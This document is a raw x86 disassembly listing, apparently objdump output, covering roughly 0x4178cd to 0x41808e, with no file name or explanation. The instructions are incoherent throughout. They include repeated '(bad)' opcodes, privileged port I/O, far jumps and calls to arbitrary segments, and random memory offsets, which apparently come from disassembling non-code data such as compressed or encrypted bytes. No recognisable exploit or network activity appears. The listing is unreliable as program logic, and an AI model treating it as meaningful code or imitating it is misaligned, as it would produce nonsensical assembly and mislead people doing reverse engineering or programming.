  4178cd:	push   ebp
  4178ce:	sub    eax,0x50f90233
  4178d3:	push   0x401925d7
  4178d8:	pop    edi
  4178d9:	in     eax,0x2a
  4178db:	inc    esp
  4178dd:	cmp    eax,0x9349b31
  4178e2:	jl     0x41792d
  4178e4:	clc    
  4178e5:	leave  
  4178e6:	lods   eax,DWORD PTR ds:[esi]
  4178e7:	push   0x4bab99f4
  4178ec:	xor    esi,DWORD PTR [ecx-0x73df872e]
  4178f2:	inc    esp
  4178f3:	xor    al,0xfc
  4178f5:	mov    ds:0x1bf9f7cc,al
  4178fa:	fisttp QWORD PTR [esi+0x72]
  4178fd:	mov    DWORD PTR ds:0x3351666d,eax
  417903:	pop    ebx
  417904:	inc    edi
  417905:	xor    DWORD PTR [ebx-0x5c],edx
  417908:	inc    ebp
  417909:	xchg   ebp,eax
  41790a:	inc    ecx
  41790b:	jle    0x41796a
  41790d:	icebp  
  41790e:	mov    dl,0x24
  417910:	mov    WORD PTR [ebx-0x14],cs
  417913:	mov    fs,WORD PTR [eax-0x1c2296de]
  417919:	fld    st(5)
  41791b:	cmc    
  41791c:	xchg   esp,eax
  41791d:	test   eax,0xfa7640da
  417922:	ins    BYTE PTR es:[edi],dx
  417923:	adc    edx,DWORD PTR [ecx]
  417925:	div    BYTE PTR [edi+0x584caddc]
  41792b:	add    edx,DWORD PTR [edx-0x2120895e]
  417931:	jb     0x4178c3
  417933:	std    
  417934:	cli    
  417935:	mov    DWORD PTR [esi+0x73b1cf76],esp
  41793b:	sub    DWORD PTR [edx+0x64f86c8],edi
  417941:	sti    
  417942:	mov    eax,0x7f274242
  417947:	data16 jl 0x4179b1
  41794a:	xchg   DWORD PTR [edi],ecx
  41794c:	push   eax
  41794d:	pusha  
  41794e:	sbb    esi,ebx
  417950:	inc    DWORD PTR [edi+eiz*4-0x39a33565]
  417957:	pop    edi
  417958:	pop    ecx
  417959:	imul   eax,DWORD PTR ds:[edi+0x43],0x9c329d13
  417961:	shr    DWORD PTR [edi],0xb3
  417964:	mov    bh,0x53
  417966:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417967:	push   edx
  417968:	fbstp  TBYTE PTR [ecx]
  41796a:	jne    0x4179ab
  41796c:	or     esi,DWORD PTR [ebx-0x7bddbe6b]
  417972:	stos   DWORD PTR es:[edi],eax
  417973:	sbb    edx,esp
  417975:	xchg   esp,eax
  417976:	jp     0x41798c
  417978:	(bad)  
  417979:	or     DWORD PTR [ebp+0x54d726de],ebp
  41797f:	add    BYTE PTR [esi-0x76],ah
  417982:	inc    eax
  417983:	aas    
  417984:	stos   BYTE PTR es:[edi],al
  417985:	test   ah,dl
  417987:	mov    ?,WORD PTR [edx+0x48]
  41798a:	mov    ds:0x9d801d4f,al
  41798f:	xchg   esi,eax
  417990:	out    dx,eax
  417991:	imul   ebp,DWORD PTR [ebp+0x26],0x859489de
  417998:	adc    ecx,ecx
  41799a:	fisttp QWORD PTR [ecx]
  41799c:	add    dh,BYTE PTR [edx+0x5daefb46]
  4179a2:	loope  0x417a18
  4179a4:	shl    BYTE PTR [edx+edx*8+0x64],0x2b
  4179a9:	dec    ebx
  4179aa:	or     DWORD PTR [eax],ebx
  4179ac:	cld    
  4179ad:	lock cmp DWORD PTR [ecx+ebp*4],esi
  4179b1:	inc    edi
  4179b2:	inc    esi
  4179b3:	in     eax,dx
  4179b4:	add    eax,0xcfae08ad
  4179b9:	and    eax,0x91a2256d
  4179be:	das    
  4179bf:	(bad)  
  4179c0:	or     al,0x82
  4179c2:	sar    DWORD PTR [edx-0x385c507d],cl
  4179c8:	xchg   esp,eax
  4179c9:	dec    ecx
  4179ca:	dec    esi
  4179cb:	inc    ebp
  4179cc:	fst    st(7)
  4179ce:	inc    esi
  4179cf:	cmp    al,0x36
  4179d1:	enter  0x8b69,0xb
  4179d5:	and    BYTE PTR [ebp+esi*2-0x4d],0x46
  4179da:	and    eax,0xcf635a4b
  4179df:	xor    DWORD PTR [edx+eiz*1+0x5],esi
  4179e3:	lds    eax,FWORD PTR [edi+edx*2]
  4179e6:	xchg   ebx,eax
  4179e7:	or     esp,DWORD PTR [ecx+0x15]
  4179ea:	mov    ds:0x90fedc89,eax
  4179ef:	scas   eax,DWORD PTR es:[edi]
  4179f0:	rcl    DWORD PTR [eax-0x1e1ed59f],1
  4179f6:	dec    edi
  4179f7:	rol    DWORD PTR [ebx+0x48],1
  4179fa:	mul    DWORD PTR [edx]
  4179fc:	jmp    0x4179f5
  4179fe:	xor    al,BYTE PTR [edi]
  417a00:	xchg   edx,eax
  417a01:	add    eax,0x3c4d2638
  417a06:	shl    BYTE PTR [ecx],cl
  417a08:	cmp    ecx,eax
  417a0a:	mov    esp,0xad620758
  417a0f:	test   DWORD PTR [eax+0x74e38bc6],ebx
  417a15:	ja     0x417a71
  417a17:	push   edx
  417a18:	xchg   BYTE PTR [edx],bh
  417a1a:	pop    eax
  417a1b:	rcl    BYTE PTR [edx+0x546456c1],0x1
  417a22:	aam    0x31
  417a24:	scas   eax,DWORD PTR es:[edi]
  417a25:	(bad)  
  417a27:	lahf   
  417a28:	nop
  417a29:	or     edx,0xe2a73161
  417a2f:	fwait
  417a30:	dec    ebx
  417a31:	push   ebp
  417a32:	xchg   esi,eax
  417a33:	in     eax,dx
  417a34:	repz xchg edi,eax
  417a36:	mov    edx,0xf738b34f
  417a3b:	aam    0xb0
  417a3d:	test   BYTE PTR [esp+eax*8],bh
  417a40:	repnz in al,0x2b
  417a43:	cmp    DWORD PTR [ecx-0x5b],0xf3478494
  417a4a:	in     al,0xcb
  417a4c:	mov    edx,DWORD PTR [eax+0x19]
  417a4f:	dec    ecx
  417a50:	shl    DWORD PTR [ebx+ecx*8],1
  417a53:	js     0x417a4b
  417a55:	xchg   esp,eax
  417a56:	stos   DWORD PTR es:[edi],eax
  417a57:	adc    eax,0xc8b21b
  417a5c:	das    
  417a5d:	sahf   
  417a5e:	adc    BYTE PTR [esi+0x2f],dh
  417a61:	into   
  417a62:	repnz fdiv DWORD PTR [ebx+0x16]
  417a66:	scas   al,BYTE PTR es:[edi]
  417a67:	imul   esi,edi,0x62
  417a6a:	lahf   
  417a6b:	mov    ecx,0x79eb9975
  417a70:	dec    ecx
  417a71:	ins    BYTE PTR es:[edi],dx
  417a72:	addr16 and al,0x12
  417a75:	pop    es
  417a76:	mov    WORD PTR [ebp-0x37],ss
  417a79:	lock lods al,BYTE PTR ds:[esi]
  417a7b:	pop    esp
  417a7c:	cli    
  417a7d:	jge    0x417acb
  417a7f:	and    al,0x24
  417a81:	add    BYTE PTR [edi+0x6f],dl
  417a84:	xchg   edx,eax
  417a85:	rcr    bl,1
  417a87:	fwait
  417a88:	or     ebx,DWORD PTR [ebp-0x6b]
  417a8b:	out    0xef,eax
  417a8d:	stos   DWORD PTR es:[edi],eax
  417a8e:	xor    ch,BYTE PTR [edi+0xa]
  417a91:	sub    BYTE PTR [edi+0x21],dl
  417a94:	adc    eax,0x11ac10ed
  417a99:	das    
  417a9a:	xchg   ebx,eax
  417a9b:	mov    dl,0xc4
  417a9d:	aaa    
  417a9e:	push   ecx
  417a9f:	out    dx,eax
  417aa0:	(bad)  [esi]
  417aa2:	inc    esi
  417aa3:	in     al,0x83
  417aa5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417aa6:	bound  esi,QWORD PTR [ebx+eiz*1]
  417aa9:	pop    edi
  417aaa:	add    DWORD PTR [eax+0x55],ebx
  417aad:	cmp    eax,0x67bd7270
  417ab2:	jnp    0x417a40
  417ab4:	cmp    BYTE PTR [eax],bh
  417ab6:	mov    esp,DWORD PTR [edi+ecx*4+0x623ea41d]
  417abd:	fst    DWORD PTR [esi]
  417abf:	dec    ebp
  417ac0:	ins    BYTE PTR es:[edi],dx
  417ac1:	xor    bh,BYTE PTR [edi]
  417ac3:	xor    DWORD PTR [edi+ecx*2+0x29],0x7
  417ac8:	ret    
  417ac9:	mov    edi,?
  417acb:	stos   BYTE PTR es:[edi],al
  417acc:	mov    ds:0x9012b1ca,al
  417ad1:	jle    0x417b0b
  417ad3:	sub    eax,0xd31ff157
  417ad8:	pop    ss
  417ad9:	xchg   edx,eax
  417ada:	(bad)  
  417adb:	outs   dx,DWORD PTR ds:[esi]
  417adc:	neg    DWORD PTR [esi+0x40]
  417adf:	mov    edi,0xfb3261e
  417ae4:	push   ecx
  417ae5:	add    eax,0x32a39720
  417aea:	sub    al,0x3d
  417aec:	inc    edi
  417aed:	sbb    al,BYTE PTR [eax-0x55]
  417af0:	add    eax,0x8ea3de7a
  417af5:	xor    eax,DWORD PTR [ebx-0x3e]
  417af8:	lahf   
  417af9:	xor    eax,DWORD PTR [esp+eiz*8+0x546c3c04]
  417b00:	mov    edi,0xf9282b28
  417b05:	xchg   ebp,eax
  417b06:	sti    
  417b07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417b08:	fsubr  QWORD PTR [ecx-0x381c3aa2]
  417b0e:	jge    0x417b8d
  417b10:	inc    edi
  417b11:	adc    al,0xbb
  417b13:	pop    es
  417b14:	rol    DWORD PTR [ebp+0x25],0x5
  417b18:	pop    es
  417b19:	jno    0x417b3c
  417b1b:	and    dh,BYTE PTR [ecx+ebx*8]
  417b1e:	push   ebx
  417b1f:	jmp    0x4921:0x4e5ce2d3
  417b26:	dec    eax
  417b27:	xchg   edi,eax
  417b28:	mov    ds:0xdf492503,eax
  417b2d:	push   edx
  417b2e:	outs   dx,DWORD PTR ds:[esi]
  417b2f:	dec    ebx
  417b30:	call   0xd5ed:0x681ca2aa
  417b37:	sub    al,0xeb
  417b39:	xor    DWORD PTR [esi],eax
  417b3b:	div    BYTE PTR [edi-0x3565a6af]
  417b41:	pop    ebp
  417b42:	ficom  WORD PTR [eax+edi*4-0x69]
  417b46:	pop    ebx
  417b47:	stc    
  417b48:	nop
  417b49:	jle    0x417b99
  417b4b:	leave  
  417b4c:	sbb    DWORD PTR [ecx-0x2c8e7621],edx
  417b52:	jp     0x417ae1
  417b54:	es pop ebx
  417b56:	int3   
  417b57:	and    DWORD PTR [esi+0x30500127],eax
  417b5d:	jmp    0x3e6d:0xa9695316
  417b64:	cmp    eax,0x4abd56fc
  417b69:	inc    ecx
  417b6a:	mov    DWORD PTR [esp+ebp*8+0x17fb5f0c],edx
  417b71:	(bad)  
  417b72:	mov    bl,0xd2
  417b74:	retf   0xdf2d
  417b77:	dec    edx
  417b78:	adc    edx,DWORD PTR [edi]
  417b7a:	ret    
  417b7b:	loope  0x417b3d
  417b7d:	fdivr  DWORD PTR [ebx+eax*8]
  417b80:	mov    ebx,ebp
  417b82:	clc    
  417b83:	dec    ecx
  417b84:	push   eax
  417b85:	xchg   ebx,eax
  417b86:	in     eax,dx
  417b87:	and    ch,bl
  417b89:	iret   
  417b8a:	mov    eax,0xcdf322b8
  417b8f:	popf   
  417b90:	fcom   QWORD PTR [esi]
  417b92:	pop    ss
  417b93:	mov    bh,0x1
  417b95:	mov    ebx,0x86a7da13
  417b9a:	jmp    0xc0a813f2
  417b9f:	dec    ebx
  417ba0:	or     BYTE PTR [edi],ah
  417ba2:	pop    esi
  417ba3:	lahf   
  417ba4:	aas    
  417ba5:	gs jmp 0x8fd4:0x7ced0a89
  417bad:	sub    eax,0x3772f94f
  417bb2:	popa   
  417bb3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417bb4:	rcr    DWORD PTR [ebp+0x4d],cl
  417bb7:	jo     0x417c23
  417bb9:	mov    ds:0x2b5832a2,al
  417bbe:	arpl   WORD PTR ds:0x92a6bf08,dx
  417bc4:	cwde   
  417bc5:	dec    esi
  417bc6:	(bad)  
  417bc7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417bc8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417bc9:	ret    
  417bca:	xchg   edi,eax
  417bcb:	or     BYTE PTR [eax-0x77],dh
  417bce:	jl     0x417c0c
  417bd0:	rcr    al,cl
  417bd2:	push   ebp
  417bd3:	ror    DWORD PTR es:0xa6670f0a,cl
  417bda:	sub    eax,0xbb4552c0
  417bdf:	or     eax,0x61d3f22f
  417be4:	or     eax,0xb236efca
  417be9:	fisubr WORD PTR [eax+0x5b]
  417bec:	(bad)  
  417bed:	call   0xf1c4:0x7f5fe4c4
  417bf4:	in     eax,0x35
  417bf6:	(bad)  
  417bf7:	push   ebp
  417bf8:	mov    edx,0xccf11789
  417bfd:	pop    es
  417bfe:	rcr    esi,0x48
  417c01:	xor    esp,0xdc997084
  417c07:	inc    edi
  417c08:	push   ecx
  417c09:	mov    eax,0xefae51e2
  417c0e:	loope  0x417c08
  417c10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417c11:	imul   eax,DWORD PTR [edx+0x71],0x3b
  417c15:	and    al,0x23
  417c17:	fisub  DWORD PTR [edx-0x7ff9fb4]
  417c1d:	icebp  
  417c1e:	call   0xcd93:0xac451db0
  417c25:	popa   
  417c26:	loop   0x417c0b
  417c28:	(bad)  
  417c2a:	out    0x65,eax
  417c2c:	ss int3 
  417c2e:	mov    ds:0xf0d0f620,eax
  417c33:	xchg   ecx,eax
  417c34:	test   eax,0x67d50067
  417c39:	ds or  eax,0x9b816791
  417c3f:	imul   ebp,DWORD PTR [ebx-0x1399b01d],0x49
  417c46:	jb     0x417c4f
  417c48:	xor    ch,BYTE PTR [edi]
  417c4a:	mov    dl,0x16
  417c4c:	bts    eax,esi
  417c4f:	cwde   
  417c50:	aas    
  417c51:	ret    
  417c52:	iret   
  417c53:	add    al,BYTE PTR [ecx+0x2b50970d]
  417c59:	inc    esi
  417c5a:	or     eax,DWORD PTR fs:[ebp+0x11]
  417c5e:	mov    ch,0x2c
  417c60:	je     0x417bfc
  417c62:	cmp    ch,dh
  417c64:	push   esp
  417c65:	cmp    al,0x63
  417c67:	in     eax,dx
  417c68:	shl    BYTE PTR [edi+0x6b3f9ff6],1
  417c6e:	dec    ebx
  417c6f:	outs   dx,DWORD PTR ds:[esi]
  417c70:	imul   ecx,DWORD PTR [ecx],0xfffffff4
  417c73:	xchg   ebp,eax
  417c74:	retf   0x5f7c
  417c77:	inc    ecx
  417c78:	jle    0x417ca1
  417c7a:	inc    ebp
  417c7b:	add    BYTE PTR [edx],ch
  417c7d:	lock mov ebx,0x2c7531ed
  417c83:	sbb    BYTE PTR [esi-0x18],bh
  417c86:	xor    eax,DWORD PTR [ebx+0x3833cdfa]
  417c8c:	rcr    DWORD PTR [ecx],0x47
  417c8f:	bound  edi,QWORD PTR [edi+0x15]
  417c92:	mov    dl,BYTE PTR ds:0xf88b242
  417c98:	or     eax,0xe438fe49
  417c9d:	fs sbb eax,eax
  417ca0:	push   esi
  417ca1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417ca2:	mov    ch,0xb
  417ca4:	fucomi st,st(6)
  417ca6:	or     esp,ebx
  417ca8:	or     edx,esp
  417caa:	xlat   BYTE PTR ds:[ebx]
  417cab:	(bad)  
  417cac:	dec    esp
  417cad:	mov    ah,0x68
  417caf:	jle    0x417cab
  417cb1:	push   ss
  417cb2:	jnp    0x417c6c
  417cb4:	mov    ?,WORD PTR [edx+0x56]
  417cb7:	rcr    DWORD PTR [ecx+ebp*2-0x6e],cl
  417cbb:	scas   eax,DWORD PTR es:[edi]
  417cbc:	addr16 es jb 0x417ce3
  417cc0:	cmp    eax,0x5cbd966f
  417cc5:	sbb    ah,BYTE PTR [ecx+0x726b2692]
  417ccb:	add    DWORD PTR [ebx+esi*1-0x28],eax
  417ccf:	or     BYTE PTR [ecx],0x47
  417cd2:	out    dx,al
  417cd3:	nop
  417cd4:	cmp    dl,BYTE PTR [edx*8+0x1d75b9b9]
  417cdb:	mov    BYTE PTR [esi-0x65fdf451],dl
  417ce1:	or     al,0x91
  417ce3:	pop    edx
  417ce4:	pop    eax
  417ce5:	in     al,dx
  417ce6:	or     DWORD PTR [esi-0x41],ebx
  417ce9:	jns    0x417c6e
  417ceb:	js     0x417ca4
  417ced:	mov    DWORD PTR [edi+0x69731bf8],esi
  417cf3:	das    
  417cf4:	cmp    ebp,DWORD PTR [ebx-0x13b1afd5]
  417cfa:	aas    
  417cfb:	imul   ebx,DWORD PTR [ebp+0x32e99be3],0xd5697731
  417d05:	inc    ebx
  417d06:	and    al,0x5c
  417d08:	mov    esi,DWORD PTR gs:[ebp+eax*4-0x73]
  417d0d:	adc    BYTE PTR [eax+0x5b8f1f2a],0x25
  417d14:	sbb    BYTE PTR [ebx-0x2888d2e1],al
  417d1a:	mov    ebp,DWORD PTR [esi+0x314f987]
  417d20:	fs stos BYTE PTR es:[edi],al
  417d22:	and    edx,DWORD PTR [edi-0x70]
  417d25:	inc    edi
  417d26:	or     eax,0xb6e55b99
  417d2b:	repz test DWORD PTR [edi+0x284a552a],0xe62d4f16
  417d36:	int    0x43
  417d38:	rcr    DWORD PTR [edx],0x85
  417d3b:	retf   0x7493
  417d3e:	push   edi
  417d3f:	mov    ecx,0x280b98a2
  417d44:	mov    dh,0xe9
  417d46:	sbb    ebp,edx
  417d48:	fmul   DWORD PTR [esi-0x1923b7f8]
  417d4e:	dec    esp
  417d4f:	sbb    ebx,DWORD PTR [eax-0x3053eb2c]
  417d55:	and    cl,dl
  417d57:	cmp    al,0xf4
  417d59:	in     eax,dx
  417d5a:	fdivp  st(7),st
  417d5c:	scas   eax,DWORD PTR es:[edi]
  417d5d:	repnz clc 
  417d5f:	and    ecx,edi
  417d61:	scas   eax,DWORD PTR es:[edi]
  417d62:	clc    
  417d63:	test   ch,dl
  417d65:	cmp    DWORD PTR [edi-0xbca1e24],esp
  417d6b:	scas   eax,DWORD PTR es:[edi]
  417d6c:	(bad)
  417d6f:	mov    bl,0xef
  417d71:	test   DWORD PTR [esp+esi*8],esp
  417d74:	jecxz  0x417d5e
  417d76:	inc    ebp
  417d77:	call   DWORD PTR [ebp+0x32259482]
  417d7d:	stc    
  417d7e:	mov    dl,0x3f
  417d80:	gs mov eax,0x4c86d696
  417d86:	cmc    
  417d87:	add    ah,BYTE PTR [ebx-0x23]
  417d8a:	icebp  
  417d8b:	mov    ds:0xe227c27d,eax
  417d90:	mov    WORD PTR [ebx],?
  417d92:	shr    DWORD PTR [edx-0x2698b932],cl
  417d98:	xchg   ebp,eax
  417d99:	ins    BYTE PTR es:[edi],dx
  417d9a:	imul   eax,DWORD PTR [ebp+0x24],0xd0bb40e3
  417da1:	adc    dl,0x2
  417da4:	xchg   esi,eax
  417da5:	xor    BYTE PTR [ebx-0x77],0xb2
  417da9:	sub    eax,DWORD PTR [esi-0x3fffb690]
  417daf:	or     ebp,esi
  417db1:	in     eax,0xcd
  417db3:	sbb    BYTE PTR [ecx+eax*2+0x7c],cl
  417db7:	aad    0xc0
  417db9:	fptan  
  417dbb:	data16 arpl ax,dx
  417dbe:	aad    0x43
  417dc0:	and    BYTE PTR [ebp-0x78],bh
  417dc3:	test   DWORD PTR [ebp+0x36],ecx
  417dc6:	dec    edx
  417dc7:	xor    al,dh
  417dc9:	dec    esi
  417dca:	(bad)  
  417dcb:	aaa    
  417dcc:	jb     0x417d5e
  417dce:	nop
  417dcf:	int3   
  417dd0:	stc    
  417dd1:	mov    eax,ds:0x39d63be9
  417dd6:	add    edi,DWORD PTR [esi]
  417dd8:	mov    bh,0xd0
  417dda:	outs   dx,DWORD PTR ds:[esi]
  417ddb:	es jo  0x417dd6
  417dde:	sbb    BYTE PTR [edi-0x32],dl
  417de1:	in     eax,dx
  417de2:	mov    ebx,0x9ae03996
  417de7:	add    DWORD PTR [esi+ecx*1],0xbdd98753
  417dee:	lds    eax,FWORD PTR [ebp-0x18]
  417df1:	icebp  
  417df2:	jbe    0x417dbd
  417df4:	repnz or DWORD PTR [ebp-0x13],0x14
  417df9:	jge    0x417dea
  417dfb:	add    eax,esp
  417dfd:	pop    eax
  417dfe:	xchg   ebx,eax
  417dff:	mov    edx,0xc056a06a
  417e04:	ins    BYTE PTR es:[edi],dx
  417e05:	mov    bl,bl
  417e07:	jp     0x417dad
  417e09:	addr16 mov dh,0x86
  417e0c:	shl    bl,0x5a
  417e0f:	pop    ss
  417e10:	inc    edx
  417e11:	in     al,dx
  417e12:	cdq    
  417e13:	jp     0x417dfc
  417e15:	add    DWORD PTR [eax+edx*4+0x6a9a2e0c],esi
  417e1c:	or     esp,0xdc929872
  417e22:	arpl   WORD PTR [ebp+0x717e4cd8],si
  417e28:	mov    ecx,0xe46d9ea4
  417e2d:	mov    bh,0xb4
  417e2f:	jns    0x417e38
  417e31:	sub    al,0x3d
  417e33:	push   ss
  417e34:	out    dx,eax
  417e35:	mov    edi,0x80ddfb33
  417e3a:	push   edx
  417e3b:	xchg   ebp,eax
  417e3c:	stos   BYTE PTR es:[edi],al
  417e3d:	jecxz  0x417e88
  417e3f:	push   ebp
  417e40:	repnz mov si,bx
  417e44:	cvtps2pd xmm6,QWORD PTR [ecx]
  417e47:	fistp  WORD PTR [eax+0x7b]
  417e4a:	and    ebp,0xfbec9eb5
  417e50:	das    
  417e51:	or     eax,0x496e23c6
  417e56:	lods   al,BYTE PTR ds:[esi]
  417e57:	push   ds
  417e58:	sub    al,0xc4
  417e5a:	sub    DWORD PTR [ecx],edi
  417e5c:	scas   eax,DWORD PTR es:[edi]
  417e5d:	xchg   ebp,eax
  417e5e:	pop    ecx
  417e5f:	icebp  
  417e60:	push   ds
  417e61:	push   0xffffffa1
  417e63:	outs   dx,BYTE PTR ds:[esi]
  417e64:	jnp    0x417e22
  417e66:	push   ds
  417e67:	jno    0x417e7e
  417e69:	call   0xb42088fe
  417e6e:	dec    edi
  417e6f:	je     0x417e25
  417e71:	test   DWORD PTR [edi-0x11],esp
  417e74:	fnstenv [edx-0x62]
  417e77:	aas    
  417e78:	popf   
  417e79:	rcr    BYTE PTR [edx-0x3589bd96],0xaf
  417e80:	leave  
  417e81:	inc    ebp
  417e82:	dec    edi
  417e83:	mov    DWORD PTR [ecx],ebp
  417e85:	pop    edi
  417e86:	cmp    al,BYTE PTR [edi]
  417e88:	mov    WORD PTR [eax],es
  417e8a:	push   cs
  417e8b:	mov    bh,0x49
  417e8d:	call   0x621ab033
  417e92:	jnp    0x417ed5
  417e94:	sub    dh,bl
  417e96:	mov    bl,0x22
  417e98:	mov    BYTE PTR [ecx],bl
  417e9a:	in     eax,dx
  417e9b:	or     al,0x6b
  417e9d:	xor    DWORD PTR gs:[eax],0x56
  417ea1:	jb     0x417eb9
  417ea3:	mov    al,0xe9
  417ea5:	icebp  
  417ea6:	mov    eax,edx
  417ea8:	jl     0x417eda
  417eaa:	pop    ebx
  417eab:	aad    0x16
  417ead:	rcl    BYTE PTR [esp+ecx*8-0x2013e943],0x68
  417eb5:	cli    
  417eb6:	pushf  
  417eb7:	push   edi
  417eb8:	ret    
  417eb9:	rcr    DWORD PTR [ecx+edx*2+0x4e],cl
  417ebd:	dec    ebp
  417ebf:	dec    esi
  417ec0:	fwait
  417ec1:	(bad)  
  417ec2:	adc    al,0xf2
  417ec4:	dec    ecx
  417ec5:	pop    esi
  417ec6:	mov    ebx,edi
  417ec8:	lahf   
  417ec9:	push   es
  417eca:	mov    al,0xfe
  417ecc:	mov    edi,0xe3d59c94
  417ed1:	dec    edi
  417ed2:	shl    DWORD PTR [ecx-0x62],0x77
  417ed6:	jecxz  0x417e5d
  417ed8:	push   edx
  417ed9:	add    DWORD PTR [ebx-0x56f6d52a],esi
  417edf:	or     BYTE PTR [ecx+0x33],dh
  417ee2:	adc    esp,DWORD PTR [ebp-0x53]
  417ee5:	pop    eax
  417ee6:	sub    DWORD PTR [ebx+0x1bfb4884],ecx
  417eec:	int    0x8
  417eee:	nop
  417eef:	ja     0x417ef1
  417ef1:	ret    0x3b2c
  417ef4:	jp     0x417f28
  417ef6:	inc    ebx
  417ef7:	mov    ds:0xf7dc519,al
  417efc:	push   ds
  417efd:	dec    esp
  417efe:	dec    esp
  417eff:	sbb    ebp,DWORD PTR [ebp-0x3c0b4f28]
  417f05:	cmp    BYTE PTR [ecx-0x59887b85],0x4c
  417f0c:	dec    ebp
  417f0d:	sti    
  417f0e:	pop    ecx
  417f0f:	add    dl,al
  417f11:	stos   DWORD PTR es:[edi],eax
  417f12:	mov    ebx,0x447adcf0
  417f17:	cmp    edx,DWORD PTR [eax+eiz*4-0x309e3855]
  417f1e:	inc    eax
  417f1f:	sbb    BYTE PTR [ecx-0x200b4ae7],bl
  417f25:	out    dx,al
  417f26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417f27:	hlt    
  417f28:	or     eax,0x7a57a234
  417f2d:	mov    esi,0xfe6fcae5
  417f32:	mov    BYTE PTR [ebp-0x16],ch
  417f35:	jnp    0x417f5d
  417f37:	mov    DWORD PTR [esi-0x280f428b],ecx
  417f3d:	shr    BYTE PTR [ecx],cl
  417f3f:	daa    
  417f40:	stc    
  417f41:	outs   dx,DWORD PTR ds:[esi]
  417f42:	aam    0xd
  417f44:	and    al,0x24
  417f46:	cs inc ax
  417f49:	xchg   esp,eax
  417f4a:	jo     0x417f45
  417f4c:	xchg   ebp,esi
  417f4e:	cmp    eax,0xc766c007
  417f53:	push   cs
  417f54:	and    al,BYTE PTR [ebp-0x6c]
  417f57:	jl     0x417f60
  417f59:	jmp    0xf5f3:0x7fb3e6d9
  417f60:	je     0x417fa7
  417f62:	scas   eax,DWORD PTR es:[edi]
  417f63:	mov    DWORD PTR [edx+ebx*2],0x5398dd02
  417f6a:	cld    
  417f6b:	pop    ebx
  417f6c:	pushf  
  417f6d:	or     edx,DWORD PTR [ebx-0x7474ce77]
  417f73:	(bad)  
  417f74:	sbb    eax,0x9916ec1f
  417f79:	into   
  417f7a:	mov    bl,0x6f
  417f7c:	jle    0x417f85
  417f7e:	sub    bh,bh
  417f80:	xor    al,0xa2
  417f82:	cli    
  417f83:	mov    ds:0x7f228da9,al
  417f88:	jge    0x417f26
  417f8a:	xchg   edi,eax
  417f8b:	stos   BYTE PTR es:[edi],al
  417f8c:	out    dx,al
  417f8d:	and    BYTE PTR [esi],dh
  417f8f:	arpl   WORD PTR [ecx+edx*2-0x36],sp
  417f93:	mov    eax,ds:0x8ab3a999
  417f98:	cwde   
  417f99:	or     DWORD PTR [ebp-0x44],edi
  417f9c:	pop    ecx
  417f9d:	jo     0x417fc8
  417f9f:	cdq    
  417fa0:	jmp    0x3af5199b
  417fa5:	mov    dh,0x99
  417fa7:	xchg   DWORD PTR [esi-0x4310a40e],ebp
  417fad:	or     eax,0x37f673db
  417fb2:	clc    
  417fb3:	out    dx,eax
  417fb4:	jge    0x418026
  417fb6:	adc    DWORD PTR [edi+0x64],edx
  417fb9:	or     eax,0x5ec49ddb
  417fbe:	sub    cl,BYTE PTR ds:0x956daec0
  417fc4:	pop    ecx
  417fc5:	sub    eax,0x77704ed2
  417fca:	fsubr  QWORD PTR [ebp+0x15]
  417fcd:	test   al,0x54
  417fcf:	test   BYTE PTR [esi],0xa6
  417fd2:	dec    eax
  417fd3:	out    0x46,eax
  417fd5:	or     DWORD PTR ds:0xfe2b5f4b,eax
  417fdb:	dec    ebx
  417fdc:	and    ah,BYTE PTR [edx]
  417fde:	jmp    0x418036
  417fe0:	xchg   edi,eax
  417fe1:	sbb    ch,BYTE PTR [esi]
  417fe3:	and    DWORD PTR [ecx],esp
  417fe5:	adc    al,0xf4
  417fe7:	imul   ebp,DWORD PTR [ecx],0xffffffa3
  417fea:	arpl   WORD PTR [esi-0x3d448173],si
  417ff0:	int    0x27
  417ff2:	cwde   
  417ff3:	adc    bh,cl
  417ff5:	inc    ebp
  417ff6:	dec    ebx
  417ff7:	pop    es
  417ff8:	mov    cl,0xdb
  417ffa:	outs   dx,BYTE PTR ds:[esi]
  417ffb:	adc    eax,0xcc3c1c7b
  418000:	inc    eax
  418001:	ins    BYTE PTR es:[edi],dx
  418002:	fwait
  418003:	in     eax,dx
  418004:	mov    al,ds:0x420a348e
  418009:	xchg   DWORD PTR [esi-0x5bbb27a6],edx
  41800f:	sub    eax,0x6fb0a2e1
  418014:	dec    ebx
  418015:	test   eax,0x8f219ef1
  41801a:	arpl   WORD PTR [eax-0x14a40f33],di
  418020:	rcr    BYTE PTR [edi+edx*1],0x3f
  418024:	test   al,0x1
  418026:	retf   0xe654
  418029:	xlat   BYTE PTR ds:[ebx]
  41802a:	xor    BYTE PTR [ebx],bl
  41802c:	pop    ebx
  41802d:	cs pop es
  41802f:	jbe    0x418036
  418031:	adc    al,0x80
  418033:	(bad)  
  418035:	or     eax,0x9c4c366d
  41803a:	mov    ebp,0x3885c381
  41803f:	cld    
  418040:	sti    
  418041:	dec    edx
  418042:	xor    al,0xfe
  418044:	das    
  418045:	(bad)  
  418046:	in     al,dx
  418047:	cmp    eax,0x5f928d70
  41804c:	mov    eax,0xeb0f38a2
  418051:	jne    0x418047
  418053:	mov    ebp,0x7b58b430
  418058:	pusha  
  418059:	cs (bad) 
  41805b:	pop    edi
  41805c:	mov    bh,0x37
  41805e:	or     BYTE PTR [ebp+0x48d2ff95],cl
  418064:	imul   ecx,DWORD PTR [eax],0xffffffbf
  418067:	jmp    0x18e8:0xca13c164
  41806e:	xchg   BYTE PTR [edi],bl
  418070:	jp     0x41804d
  418072:	jge    0x41800e
  418074:	dec    ebx
  418075:	adc    bh,bh
  418077:	add    al,0xc9
  418079:	pushf  
  41807a:	out    0x42,eax
  41807c:	and    ch,ch
  41807e:	xchg   ebx,eax
  41807f:	add    eax,0x8128f6b9
  418084:	stos   BYTE PTR es:[edi],al
  418085:	sub    BYTE PTR [esi],dl
  418087:	xchg   ecx,eax
  418088:	push   edi
  418089:	(bad)  
  41808a:	lock mov dl,0x30
  41808d:	pop    ss
  41808e:	es and dl,cl
